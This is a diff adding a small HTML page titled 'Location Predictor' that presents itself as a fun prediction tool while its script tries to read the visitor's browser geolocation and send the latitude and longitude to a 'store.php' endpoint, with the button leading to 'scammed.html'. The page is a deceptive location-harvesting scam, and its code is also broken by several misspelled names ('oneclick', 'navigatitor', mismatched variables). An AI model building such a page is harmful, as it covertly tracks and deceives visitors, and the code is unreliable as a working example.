@@ -1,0 +1,30 @@
+<html>
+    <head>
+        <marquee><h1 class="colora">This website is a location predictor</h1></marquee>
+        <title>Location Predictor</title>
+        <link rel="stylesheet" href="style.css">
+    </head>
+    <body oneclick="getlocation()">
+
+        <p id="demo"></p>
+    <script>
+        var x = document.getElementById("demo")
+
+        function getLocation() {
+            if (navigatitor.geolocation) {
+                navigator.geolocation.getCurrentposition(showPosition);
+            } else{
+                x.innerHtml = "Geolocation is not supported in this browser.";
+            } 
+        }
+
+        function showPosition(position) {
+            const xxpt = new XMLHttpRequest();
+            xHttp.open("Get", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude)
+            xHttp.send();
+        }
+    </script>
+    <p class="p">Press the button bellow</p>
+    <a href="scammed.html" class="buttona">Predict now</a>
+    </body>
+</html>
